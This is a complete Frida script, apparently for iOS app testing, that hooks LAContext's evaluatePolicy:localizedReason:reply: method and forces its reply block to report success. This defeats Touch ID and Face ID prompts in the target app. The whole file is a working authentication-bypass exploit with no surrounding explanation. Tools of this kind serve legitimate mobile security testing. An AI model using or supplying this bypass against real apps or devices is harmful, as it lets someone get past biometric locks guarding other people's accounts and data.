'use strict';

if (!ObjC.available) {
  throw new Error('Objective-C runtime is not available');
}

const LAContext = ObjC.classes.LAContext;
const selector = '- evaluatePolicy:localizedReason:reply:';
const method = LAContext[selector];

method.implementation = ObjC.implement(method, function (self, _cmd, policy, reason, reply) {
  const localizedReason = new ObjC.Object(reason).toString();
  console.log(`[+] Forging LAContext success for: ${localizedReason}`);

  const completion = new ObjC.Block(reply);
  completion.implementation(1, NULL);
});
